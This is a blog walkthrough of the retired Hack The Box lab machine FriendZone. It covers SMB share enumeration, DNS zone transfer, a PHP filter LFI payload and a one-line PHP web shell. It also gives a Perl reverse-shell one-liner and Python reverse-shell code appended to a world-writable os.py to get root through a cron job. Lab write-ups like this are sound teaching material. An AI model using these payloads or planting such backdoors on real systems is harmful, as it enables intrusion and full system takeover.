---
layout: post
title: "FriendZone: Hack The Box Walkthrough"
date: 2019-07-14 05:07:52 +0000
last_modified_at: 2019-07-14 21:43:33 +0000
category: Walkthrough
tags: ["Hack The Box", FriendZone, retired]
comments: true
image:
  feature: friendzone-htb-walkthrough.jpg
  credit: Oda-dao / Pixabay
  creditlink: https://pixabay.com/en/dolls-toys-boy-girl-relationships-3808465/
---

This post documents the complete walkthrough of FriendZone, a retired vulnerable [VM][1] created by [askar][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post 
{:.no_toc} 

* TOC 
{:toc}

## Background

FriendZone is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.123 --rate=1000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-02-10 12:52:26 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 21/tcp on 10.10.10.123                                    
Discovered open port 22/tcp on 10.10.10.123                                    
Discovered open port 80/tcp on 10.10.10.123                                    
Discovered open port 137/udp on 10.10.10.123                                   
Discovered open port 53/udp on 10.10.10.123                                    
Discovered open port 53/tcp on 10.10.10.123
Discovered open port 443/tcp on 10.10.10.123
Discovered open port 445/tcp on 10.10.10.123                                   
Discovered open port 139/tcp on 10.10.10.123
```

Whoa! `masscan` finds seven open TCP ports. Let's do one better with `nmap` scanning the discovered ports.

```
# nmap -n -v -Pn -p21,22,53,80,139,443,445 -A --reason -oN nmap.txt 10.10.10.123
...
PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 63 vsftpd 3.0.3
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      syn-ack ttl 63 ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    syn-ack ttl 63 Apache httpd 2.4.29
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Issuer: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-10-05T21:02:30
| Not valid after:  2018-11-04T21:02:30
| MD5:   c144 1868 5e8b 468d fc7d 888b 1123 781c
|_SHA-1: 88d2 e8ee 1c2c dbd3 ea55 2e5e cdd4 e94c 4c8b 9233
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|_  http/1.1
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
...
Host script results:
|_clock-skew: mean: -39m58s, deviation: 1h09m15s, median: 0s
| nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   FRIENDZONE<00>       Flags: <unique><active>
|   FRIENDZONE<03>       Flags: <unique><active>
|   FRIENDZONE<20>       Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2019-02-11T15:20:34+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-02-11 13:20:34
|_  start_date: N/A
```

Jeez. There are so many services I don't know where to start! Let's start with SMB or Samba in this case. We can use null session to enumerate the shares like so.

<a class="image-popup">
![120d123a.png](/assets/images/posts/friendzone-htb-walkthrough/120d123a.png)
</a>

Excellent. We have a couple of shares that we can explore.

### Information Disclosure

Among the three shares, we can mount `general` and `Development` without any credentials.

```
# mount -t cifs -o username=guest,rw //10.10.10.123/general ./general
# mount -t cifs -o username=guest,rw //10.10.10.123/Development ./development
```

In `general`, there's a file `creds.txt` that looks like this.

<a class="image-popup">
![25094e7e.png](/assets/images/posts/friendzone-htb-walkthrough/25094e7e.png)
</a>

Meanwhile, in `Development`, I can write files to it and it's already crowded with files. I'm pretty sure these files weren't there when the box was created. :smirk: Too bad the credential (`admin:WORKWORKHhallelujah@#`) can't mount the `Files` share. I'll just have to keep this in mind while I explore other services.

### DNS Zone Transfer

Let's turn our attention on the `http` service. This is how it looks like on the browser.

<a class="image-popup">
![44c8140d.png](/assets/images/posts/friendzone-htb-walkthrough/44c8140d.png)
</a>

Ouch!

There's our first clue. Recall the box runs a DNS service? The DNS server probably takes care of the `friendzoneportal.red` zone? Let's see if we can do a zone transfer on the box.

<a class="image-popup">
![b5cd665f.png](/assets/images/posts/friendzone-htb-walkthrough/b5cd665f.png)
</a>

Awesome. Experience tells me I should put those subdomains into `/etc/hosts`.

```
# echo -e "10.10.10.123\t$(host -l friendzoneportal.red 10.10.10.123 | grep "has address" | cut -d' ' -f1 | tr '\n' ' ')" >> /etc/hosts
```

But, wait. There\'s another zone—`friendzone.red` exposed by the `ssl/http` service, discovered in our `nmap` scan.

<a class="image-popup">
![569e34c9.png](/assets/images/posts/friendzone-htb-walkthrough/569e34c9.png)
</a>

Same thing. Put these subdomains to `/etc/hosts`.

```
# echo -e "10.10.10.123\t$(host -l friendzone.red 10.10.10.123 | grep "has address" | cut -d' ' -f1 | tr '\n' ' ')" >> /etc/hosts
```

### In the Zone

The domain `friendzoneportal.red` is a rabbit hole. Suffice to say, I've done my enumeration and it didn't yield any useful results. Meanwhile, the domain `friendzone.red` is the real deal under `https`. Check this out.

_administrator1.friendzone.htb_

<a class="image-popup">
![84984bd6.png](/assets/images/posts/friendzone-htb-walkthrough/84984bd6.png)
</a>

_uploads.friendzone.htb_

<a class="image-popup">
![caeefff6.png](/assets/images/posts/friendzone-htb-walkthrough/caeefff6.png)
</a>

Recall the credentials earlier? Perhaps it'll work with this admin THING? :wink:

<a class="image-popup">
![9468559f.png](/assets/images/posts/friendzone-htb-walkthrough/9468559f.png)
</a>

It worked!

<a class="image-popup">
![9f8d715b.png](/assets/images/posts/friendzone-htb-walkthrough/9f8d715b.png)
</a>

Let's do as told and visit `/dashboard.php`, shall we?

<a class="image-popup">
![dcc593b8.png](/assets/images/posts/friendzone-htb-walkthrough/dcc593b8.png)
</a>

Looking at the hint on the page, I suspect a local file inclusion (LFI) vulnerability is in the cards. Let's test it out.

<a class="image-popup">
![19fbf425.png](/assets/images/posts/friendzone-htb-walkthrough/19fbf425.png)
</a>

I strongly suspect a `timestamp.php` page is present.

<a class="image-popup">
![88780c18.png](/assets/images/posts/friendzone-htb-walkthrough/88780c18.png)
</a>

Ha Ha! An inexperienced developer. Now that I know a LFI vulnerability is present, I need a way to exploit it to read files. Enter PHP Filter.

Using the following filter, I was able to ignore another rabbit hole—the `uploads` page. I'm not even going to show the `dashboard.php` code. It's not a pretty sight.

```
pagename=php://filter/convert.base64-encode/resource=/var/www/uploads/upload
```

See? You are never going to upload anything.

```php
<?php
  // not finished yet -- friendzone admin !
  if(isset($_POST["image"])) {
    echo "Uploaded successfully !<br>";
    echo time()+3600;
  } else{
    echo "WHAT ARE YOU TRYING TO DO HOOOOOOMAN !";
  }
?>
```

Recall that I was able to write to `Directory`? Let\'s write a small PHP file to prove that we are able to run PHP code.

<div class="filename"><span>info.php</span></div>

```
# echo "<?php phpinfo(); ?>" > info.php
```

In the shares comment, `Files` was shown to be mapped to `/etc/Files`. By extension, `Development` should be mapped to `/etc/Development`.

<a class="image-popup">
![dfab6015.png](/assets/images/posts/friendzone-htb-walkthrough/dfab6015.png)
</a>

Awesome. Now, let\'s step up the game and write another small PHP file, that allows us to execute remote commands.

<div class="filename"><span>cmd.php</span></div>

```
# echo '<?php echo shell_exec($_GET[0]); ?>' > cmd.php
```

<a class="image-popup">
![5f0a0cde.png](/assets/images/posts/friendzone-htb-walkthrough/5f0a0cde.png)
</a>

Sweet. Time to get ourselves a Perl reverse shell.

## Low-Privilege Shell

Here\'s the Perl one-liner I use.

```
perl -e 'use Socket;$i="10.10.12.246";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

Of course, it\'s best to `urlencode` it to prevent complications in the browser's address bar.

<a class="image-popup">
![14648ca0.png](/assets/images/posts/friendzone-htb-walkthrough/14648ca0.png)
</a>

Better [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) my shell to a full TTY.

## Privilege Escalation

During enumeration of `www-data`'s account, I saw the credentials of `friend` lurking in `/var/www/mysql_data.conf`.

<a class="image-popup">
![65694d11.png](/assets/images/posts/friendzone-htb-walkthrough/65694d11.png)
</a>

The funny thing is MySQL is not even running! Well, let's `su` ourselves as `friend`.

The file `user.txt` is at `friend`'s home directory.

<a class="image-popup">
![38a7e04a.png](/assets/images/posts/friendzone-htb-walkthrough/38a7e04a.png)
</a>

Moving on, I noticed two interesting pieces of information:

+ `/usr/lib/python2.7/os.py` is world-writable
+ `/opt/server-admin/report.py` imports the `os` module

I think I know where this is going: privilege escalation via python library hijacking. If I had to guess, I would say there's a `cron` job running as `root` that executes `/opt/server-admin/reporter.py`.

Here's the game plan.

First, I log it to `friend` via SSH. This is easy since I already have `friend`'s password. Then I `scp` a copy of `os.py` over to the box with the following code appended.

```
import os, socket, pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.12.246',4321))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()
```

Two minutes later, a `root` shell appears in my `nc` listener.

<a class="image-popup">
![b9ab4cc0.png](/assets/images/posts/friendzone-htb-walkthrough/b9ab4cc0.png)
</a>

Getting `root.txt` is trivial with a `root` shell.

<a class="image-popup">
![c0596592.png](/assets/images/posts/friendzone-htb-walkthrough/c0596592.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/173
[2]: https://www.hackthebox.eu/home/users/profile/17292
[3]: https://www.hackthebox.eu/
